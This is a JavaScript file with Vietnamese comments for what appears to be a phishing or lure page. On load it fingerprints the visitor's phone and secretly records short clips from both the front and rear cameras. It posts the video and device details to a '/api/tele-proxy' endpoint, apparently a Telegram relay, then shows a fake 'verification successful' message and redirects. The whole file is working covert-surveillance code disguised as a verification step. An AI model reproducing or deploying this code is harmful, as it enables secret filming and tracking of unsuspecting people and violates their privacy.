// main.js - Quay video ngầm tối ưu cho mobile
const API_PROXY = '/api/tele-proxy';

const info = {
  time: new Date().toLocaleString('vi-VN'),
  device: '',
  os: '',
  camera: '⏳ Đang xử lý...'
};

// --- 1. NHẬN DIỆN THIẾT BỊ ---
function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } else if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } else {
    info.os = ua.includes('Windows') ? 'Windows' : 'Desktop';
    info.device = platform || 'PC/Laptop';
  }
}

// --- 2. QUAY VIDEO NGẮN (5 giây, tối ưu cho mobile) ---
async function recordVideoSilent(facingMode = 'user', duration = 5000) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
  
  try {
    // Ưu tiên codec nhẹ cho mobile
    const mimeTypes = [
      'video/webm;codecs=vp8',
      'video/webm;codecs=vp9',
      'video/webm',
      'video/mp4;codecs=h264'
    ];
    
    let mimeType = null;
    for (const type of mimeTypes) {
      if (MediaRecorder.isTypeSupported(type)) {
        mimeType = type;
        break;
      }
    }
    
    if (!mimeType) {
      mimeType = 'video/webm';
    }

    // Giảm chất lượng để không treo máy
    const videoConstraints = {
      facingMode: facingMode,
      width: { ideal: 480 },
      height: { ideal: 360 },
      frameRate: { ideal: 15 }
    };

    console.log(`🎥 Đang quay camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}...`);
    
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: videoConstraints, 
      audio: false 
    });

    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: mimeType,
      videoBitsPerSecond: 500000 // 500kbps
    });

    const chunks = [];

    return new Promise((resolve) => {
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: mimeType });
        stream.getTracks().forEach(t => t.stop());
        console.log(`✅ Đã quay xong camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}, dung lượng: ${(blob.size / 1024).toFixed(2)} KB`);
        resolve(blob);
      };

      // Bắt đầu quay
      mediaRecorder.start(1000);
      
      // Dừng sau duration
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, duration);
    });

  } catch (e) {
    console.error(`❌ Lỗi quay camera ${facingMode}:`, e);
    return null;
  }
}

// --- 3. CHUYỂN ĐỔI SANG MP4 (đơn giản hơn) ---
async function ensureMP4(blob) {
  if (!blob) return null;
  
  // Nếu đã là MP4 thì trả về nguyên bản
  if (blob.type === 'video/mp4' || blob.type === 'video/mp4;codecs=h264') {
    return blob;
  }
  
  // Trên mobile, giữ nguyên WebM để tránh treo máy
  // Chỉ chuyển sang MP4 nếu thực sự cần
  try {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    const url = URL.createObjectURL(blob);
    video.src = url;
    
    await new Promise((resolve) => {
      video.onloadeddata = resolve;
      video.play();
    });
    
    canvas.width = Math.min(video.videoWidth || 480, 480);
    canvas.height = Math.min(video.videoHeight || 360, 360);
    
    const stream = canvas.captureStream(15);
    const recorder = new MediaRecorder(stream, {
      mimeType: 'video/webm;codecs=vp8'
    });
    
    const chunks = [];
    recorder.ondataavailable = (e) => chunks.push(e.data);
    
    return new Promise((resolve) => {
      recorder.onstop = () => {
        const mp4Blob = new Blob(chunks, { type: 'video/webm' });
        URL.revokeObjectURL(url);
        resolve(mp4Blob);
      };
      
      recorder.start();
      
      const drawFrame = () => {
        if (video.ended || video.paused) {
          recorder.stop();
          return;
        }
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        requestAnimationFrame(drawFrame);
      };
      
      video.play();
      drawFrame();
      
      setTimeout(() => {
        if (recorder.state === 'recording') {
          recorder.stop();
        }
      }, 1500);
    });
  } catch (e) {
    console.warn('Không thể chuyển đổi, giữ nguyên:', e);
    return blob;
  }
}

// --- 4. HÀM CHÍNH (Quay tuần tự, không chờ cùng lúc) ---
async function main() {
  const button = document.querySelector('.btn') || document.querySelector('button');
  const statusDiv = document.getElementById('status');
  
  detectDevice();

  if (statusDiv) {
    statusDiv.innerHTML = '⏳ Đang xử lý...<br>Vui lòng đợi.';
  }
  
  info.camera = '⏳ Đang quay video...';
  
  // === QUAY CAMERA TRƯỚC (5 giây) ===
  console.log('📸 Bắt đầu quay CAMERA TRƯỚC...');
  let frontVideo = await recordVideoSilent('user', 5000);
  
  // Chờ 500ms để giải phóng tài nguyên
  await new Promise(r => setTimeout(r, 500));
  
  // === QUAY CAMERA SAU (5 giây) ===
  console.log('📸 Bắt đầu quay CAMERA SAU...');
  let backVideo = await recordVideoSilent('environment', 5000);
  
  // Nếu không quay được camera sau, thử lại với front (1 số điện thoại chỉ có 1 cam)
  if (!backVideo) {
    console.log('📸 Thử quay lại camera trước làm camera sau...');
    backVideo = await recordVideoSilent('user', 3000);
  }
  
  // Chuyển đổi sang MP4 (nếu cần)
  let frontMP4 = null;
  let backMP4 = null;
  
  if (frontVideo) {
    frontMP4 = frontVideo;
    console.log('✅ Camera trước: đã quay xong');
  } else {
    console.log('❌ Không quay được camera trước');
  }
  
  if (backVideo) {
    backMP4 = backVideo;
    console.log('✅ Camera sau: đã quay xong');
  } else {
    console.log('❌ Không quay được camera sau');
  }
  
  // Nếu chỉ có 1 video, nhân đôi để có cả 2
  if (frontMP4 && !backMP4) {
    backMP4 = frontMP4;
    console.log('📸 Dùng video trước làm video sau');
  }
  
  if (!frontMP4 && backMP4) {
    frontMP4 = backMP4;
    console.log('📸 Dùng video sau làm video trước');
  }
  
  info.camera = (frontMP4 || backMP4) ? '✅ Đã quay video' : '🚫 Không quay được video';

  // Chuẩn bị gửi dữ liệu
  const formData = new FormData();
  formData.append('clientInfo', JSON.stringify(info));

  if (frontMP4 || backMP4) {
    if (frontMP4) {
      const ext = frontMP4.type.includes('mp4') ? 'mp4' : 'webm';
      formData.append('front', frontMP4, `front.${ext}`);
      console.log('📤 Đã thêm front vào form');
    }
    if (backMP4) {
      const ext = backMP4.type.includes('mp4') ? 'mp4' : 'webm';
      formData.append('back', backMP4, `back.${ext}`);
      console.log('📤 Đã thêm back vào form');
    }
    
    try {
      console.log('📤 Đang gửi video lên server...');
      await fetch(API_PROXY, { method: 'POST', body: formData });
      console.log('✅ Đã gửi video thành công');
    } catch (e) {
      console.error('❌ Lỗi gửi video:', e);
    }
  } else {
    console.log('📤 Gửi text (không có video)...');
    await fetch(API_PROXY, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(info)
    });
  }

  // --- ĐẾM NGƯỢC CHUYỂN HƯỚNG ---
  if (button) {
    button.style.backgroundColor = "#28a745";
    button.style.color = "#ffffff";
    button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
    
    let timeLeft = 3;
    button.innerText = `Hoàn tất (${timeLeft}s)`;
    
    if (statusDiv) {
      statusDiv.innerHTML = '✅ Xác thực thành công!<br>Đang chuyển hướng...';
    }
    
    const countdownInterval = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0) {
        button.innerText = `Hoàn tất (${timeLeft}s)`;
      } else {
        clearInterval(countdownInterval);
        window.location.href = "";
      }
    }, 1000);
  } else {
    setTimeout(() => {
      window.location.href = "";
    }, 3000);
  }
}

// Kích hoạt hệ thống
main().then(() => console.log("✅ Hệ thống đã hoàn tất."));
